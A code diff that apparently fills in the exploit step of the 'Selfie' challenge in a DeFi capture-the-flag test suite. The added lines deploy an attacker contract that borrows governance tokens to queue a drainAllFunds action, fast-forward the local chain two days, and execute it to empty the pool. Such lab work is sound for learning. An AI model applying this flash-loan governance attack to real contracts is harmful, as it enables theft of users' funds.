@@ -31,6 +31,18 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // borrow enough token to propose gov tx
+        const poolInterface = new ethers.utils.Interface(["function drainAllFunds(address receiver) external"]);
+        let calldata = poolInterface.encodeFunctionData("drainAllFunds", [attacker.address])
+
+        const attackerFactory = await ethers.getContractFactory('SelfieAttacker', attacker);
+        this.attackContract = await attackerFactory.deploy(this.pool.address, this.governance.address, calldata);
+        await this.attackContract.connect(attacker).attack(TOKENS_IN_POOL);
+        
+        // Advance time 2 days to execute tx
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+        await this.governance.connect(attacker).executeAction(1);
     });
 
     after(async function () {
